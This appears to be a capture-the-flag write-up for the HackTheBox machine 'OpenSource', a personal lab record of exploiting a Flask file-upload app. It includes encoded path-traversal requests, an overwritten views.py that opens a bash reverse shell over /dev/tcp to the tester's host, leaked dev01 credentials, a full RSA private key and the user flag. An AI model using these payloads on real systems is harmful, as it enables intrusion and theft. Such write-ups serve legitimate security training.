---
Category: B2R
Difficulty: Easy
Platform: HackTheBox
Retired: false
Status: 3. Complete
Tags:
  - code-review
  - credentials-reuse
  - flask
  - flask-debug_mode
  - git
  - git-hook-privesc
  - hardcoded-credentials
  - insecure-file-upload
  - path-traversal
  - port-forwarding
  - python-code-injection
  - Linux
---
![OpenSource.png](../../zzz_res/attachments/OpenSource.png)

***TABLE OF CONTENTS:***

---

# Resolution summary

>[!summary]
>- Web server provided a zip file containing a **git repo** and the **source code** of Upcloud
>- Source code review allowed to identify a **path traversal vulnerability** leading to an **insecure file upload** that allowed to **overwrite the application code.** Because the Flask application ran in DEBUG mode, application’s source code was dynamically updated, leading to **arbitrary code execution** inside a docker container
>- Enumeration of the .git repo allowed to identify **dev01 credentials** inside an old git commit within the dev branch
>- Enumeration from the docker container allowed to identify **Gitea** running on target’s port 3000, **reachable only from the internal network**. Forwarding that port to the attack machine it was possible to **reuse dev01 credentials**, leaking dev01 ssh private key and logging in.
>- Local process inspection allowed to identify a cron job owned by root performing a backup of dev01 home directory using git. It was possible to escalate to root executing arbitrary code using **git hooks**

## Improved skills

- Enumerate git repository and elevate privilege using git hook
- Core review
- Exploit path traversal and insecure file upload vulnerabilities

## Used tools

- nmap
- docker
- git
- chisel

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/OpenSource]
└─$ sudo nmap 10.129.64.151 -sT -p- -oA scan/all-tcp-ports -v
...
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
3000/tcp  filtered ppp
34103/tcp filtered unknown
57131/tcp filtered unknown
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/OpenSource]
└─$ sudo nmap -p 80,22 -sV -sC -oA scan/open-tcp-ports.txt 10.129.64.151
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 15:37 EDT
Nmap scan report for 10.129.64.151
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 21 May 2022 19:37:06 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 21 May 2022 19:37:07 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=5/21%Time=62893F6B%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Sat,\x2021\x20May\x202022\x2019:37:06\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Sat,\x2021\
SF:x20May\x202022\x2019:37:07\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.11 seconds
```

# Enumeration

## Port 80 - HTTP (Werkzeug/2.1.2 Python/3.10.3)

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493.png)

**/console**

![Rabbit ho](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%201.png)

Rabbit hole

[Werkzeug Console PIN Exploit](https://www.daehee.com/werkzeug-console-pin-exploit/)

Downloaded the source code:

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%202.png)

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/OpenSource/exploit]
└─$ ls
app  build-docker.sh  config  Dockerfile  source.zip

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ ls -al
total 2948
drwxr-xr-x 5 maoutis maoutis    4096 May 23 16:15 .
drwxr-xr-x 5 maoutis maoutis    4096 May 23 09:22 ..
drwxrwxr-x 5 maoutis maoutis    4096 Apr 28 13:45 app
-rwxr-xr-x 1 maoutis maoutis     110 Apr 28 13:40 build-docker.sh
drwxr-xr-x 2 maoutis maoutis    4096 Apr 28 13:34 config
-rw-rw-r-- 1 maoutis maoutis     574 Apr 28 14:50 Dockerfile
drwxrwxr-x 8 maoutis maoutis    4096 Apr 28 14:50 .git
-rw-r--r-- 1 maoutis maoutis 2489147 May 23 09:27 source.zip

┌──(kali㉿kali)-[~/…/HTB/B2R/OpenSource/exploit]
└─$ ./build-docker.sh
Error: No such container: upcloud
Sending build context to Docker daemon  8.865MB
Step 1/12 : FROM python:3-alpine
 ---> 656462f34802
Step 2/12 : RUN apk add --update --no-cache supervisor
...
2022-05-21 19:42:47,625 INFO spawned: 'flask' with pid 7
 * Serving Flask app 'app' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://127.0.0.1:80
 * Running on http://172.17.0.2:80 (Press CTRL+C to quit)
2022-05-21 19:42:49,027 INFO success: flask entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

### git

Enumerated git history:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ git log
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ git branch
  dev
* public

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ git checkout dev                                                                                                                                                                                                                   128 ⨯
Switched to branch 'dev'

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ git log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820
Previous HEAD position was be4da71 added gitignore
HEAD is now at a76f8f7 updated

┌──(maoutis㉿kali)-[~/…/HTB/OpenSource/loot/app]
└─$ cat .vscode/settings.json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```

### Upcloud

Enumerated upcloud:

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%203.png)

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%204.png)

### Source code

- **build-docker.sh**
    
    ```bash
    #!/bin/bash
    docker rm -f upcloud
    docker build --tag=upcloud .
    docker run -p 80:80 --rm --name=upcloud upcloud
    ```
    
- **Dockerfile**
    
    ```bash
    FROM python:3-alpine
    
    # Install packages
    RUN apk add --update --no-cache supervisor
    
    # Upgrade pip
    RUN python -m pip install --upgrade pip
    
    # Install dependencies
    RUN pip install Flask
    
    # Setup app
    RUN mkdir -p /app
    
    # Switch working environment
    WORKDIR /app
    
    # Add application
    COPY app .
    
    # Setup supervisor
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Expose port the server is reachable on
    EXPOSE 80
    
    # Disable pycache
    ENV PYTHONDONTWRITEBYTECODE=1
    
    # Set mode
    ENV MODE="PRODUCTION"
    
    # Run supervisord
    CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
    ```
    
- **views.py**
    
    ```python
    import os
    
    from app.utils import get_file_name
    from flask import render_template, request, send_file
    
    from app import app
    
    @app.route('/', methods=['GET', 'POST'])
    def upload_file():
        if request.method == 'POST':
            f = request.files['file']
            file_name = get_file_name(f.filename)
            file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
            f.save(file_path)
            return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
        return render_template('upload.html')
    
    @app.route('/uploads/<path:path>')
    def send_report(path):
        path = get_file_name(path)
        return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
    ```
    
- **utils.py**
    
    ```python
    import time
    
    def current_milli_time():
        return round(time.time() * 1000)
    
    """
    Pass filename and return a secure version, which can then safely be stored on a regular file system.
    """
    
    def get_file_name(unsafe_filename):
        return recursive_replace(unsafe_filename, "../", "")
    
    """
    TODO: get unique filename
    """
    
    def get_unique_upload_name(unsafe_filename):
        spl = unsafe_filename.rsplit("\\.", 1)
        file_name = spl[0]
        file_extension = spl[1]
        return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension
    
    """
    Recursively replace a pattern in a string
    """
    
    def recursive_replace(search, replace_me, with_me):
        if replace_me not in search:
            return search
        return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
    ```
    

# Exploitation

## Path Traversal

```
GET /uploads%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd HTTP/1.1
Host: 10.129.64.151
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%205.png)

`/proc/self/environ`:

```
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sat, 21 May 2022 21:24:20 GMT
Content-Disposition: inline; filename=environ
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Sat, 21 May 2022 21:24:20 GMT
Cache-Control: no-cache
ETag: "1653168260.1997297-0-1059718893"
Date: Sat, 21 May 2022 21:24:20 GMT
Connection: close

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=33183b996874LANG=C.UTF-8GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_VERSION=3.10.3PYTHON_PIP_VERSION=22.0.4PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.pyPYTHON_GET_PIP_SHA256=e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279aPYTHONDONTWRITEBYTECODE=1MODE=PRODUCTIONFLASK_DEBUG=1HOME=/rootSUPERVISOR_ENABLED=1SUPERVISOR_PROCESS_NAME=flaskSUPERVISOR_GROUP_NAME=flaskWERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
```

>[!warning]
>Application is running in Debug mode, meaning that code can be altered at run-time without re-starting the web server!

Disclosed a secret when server errored out:

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%206.png)

## Arbitrary File Upload + Path Traversal leading to code injection

Because the **file upload** feature was **vulnerable to path traversal** and the application was running in **debug mode**, it was possible to arbitrary overwrite application source code and **inject custom code** in order to perform code execution.

Exploit:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/')
def index():
    return render_template('index.html')

...

@app.route('/maoutis')
def maoutis():
    os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.46/10099 0>&1'")
    return render_template('index.html')
```

Overwrote the existing **views.py:**

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%207.png)

Obtained the reverse shell:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/exploit]
└─$ curl http://10.129.68.116/maoutis

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.68.116] 39222
/bin/sh: can't access tty; job control turned off
/app # id; hostname
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
5db59442dad1

*** migrated the shell on nc ***
```

# Lateral Movement to user

## Local enumeration

Enumerated the target machine from the docker network:

```bash
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
16: eth0@if17: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:11:00:08 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.8/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Uploaded nmap using the file upload feature:

[static-binaries/nmap at master · andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

```bash
/app/public/uploads # ./nmap 10.129.68.116 -p 3000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-05-23 09:48 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.129.68.116
Host is up (0.000095s latency).
PORT     STATE SERVICE
3000/tcp open  unknown
```

## Port 3000 - Gitea v.1.16.6

Uploaded chisel on the box and performed a reverse tcp tunnel to port 3000:

[Releases · jpillora/chisel](https://github.com/jpillora/chisel/releases)

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/exploit]
└─$ ./chisel_1.7.7_linux_amd64 server -p 3000 --reverse
2022/05/23 13:20:13 server: Reverse tunnelling enabled
2022/05/23 13:20:13 server: Fingerprint fm9tUZlKfgimQ9iuIXsEGwfgoo8om8q5kAP2SBMVJb4=
2022/05/23 13:20:13 server: Listening on http://0.0.0.0:3000
```

```bash
/app/public/uploads # ./chisel_1.7.7_linux_amd64 client 10.10.14.46:3000 R:3001:10.129.68.116:3000
2022/05/23 11:22:55 client: Connecting to ws://10.10.14.46:3000
2022/05/23 11:22:55 client: Connected (Latency 39.166891ms)
```

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%208.png)

[Release v1.16.7 · go-gitea/gitea](https://github.com/go-gitea/gitea/releases/tag/v1.16.7)

Created a local account:

>[!important]
>maoutis     maoutis

Enumerated a user:

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%209.png)

Logged in using known credentials:

>[!important]
>dev01     Soulless_Developer#2022

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%2010.png)

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%2011.png)

Downloaded SSH keys:

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%2012.png)

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ nano dev01

-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ chmod 500 dev01

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ ssh -i dev01 dev01@opensource.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May 23 14:58:21 UTC 2022

  System load:  0.0               Processes:              223
  Usage of /:   77.0% of 3.48GB   Users logged in:        0
  Memory usage: 23%               IP address for eth0:    10.129.68.116
  Swap usage:   0%                IP address for docker0: 172.17.0.1

16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ id; hostname
uid=1000(dev01) gid=1000(dev01) groups=1000(dev01)
opensource

dev01@opensource:~$ cat user.txt 
d50f635f2d44b8fa66270936d58258f1
```

### API (rabbit hole)

Enumerated API:

```html
/app/public/uploads # wget -qO - 10.129.68.116:3000/api/swagger
<!DOCTYPE html>
<html lang="en">
        <head>
                <meta charset="UTF-8">
                <title>Gitea API</title>
                <link href="/assets/css/swagger.css?v=7e6e145c0ebc112485ff39e380b62835" rel="stylesheet">
        </head>
        <body>
                <a class="swagger-back-link" href="http://opensource.htb:3000/"><svg viewBox="0 0 16 16" class="svg octicon-reply" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M6.78 1.97a.75.75 0 0 1 0 1.06L3.81 6h6.44A4.75 4.75 0 0 1 15 10.75v2.5a.75.75 0 0 1-1.5 0v-2.5a3.25 3.25 0 0 0-3.25-3.25H3.81l2.97 2.97a.75.75 0 1 1-1.06 1.06L1.47 7.28a.75.75 0 0 1 0-1.06l4.25-4.25a.75.75 0 0 1 1.06 0z"/></svg>Return to Gitea</a>
                <div id="swagger-ui" data-source="http://opensource.htb:3000/swagger.v1.json"></div>
                <script src="/assets/js/swagger.js?v=7e6e145c0ebc112485ff39e380b62835"></script>
        </body>
</html>
```

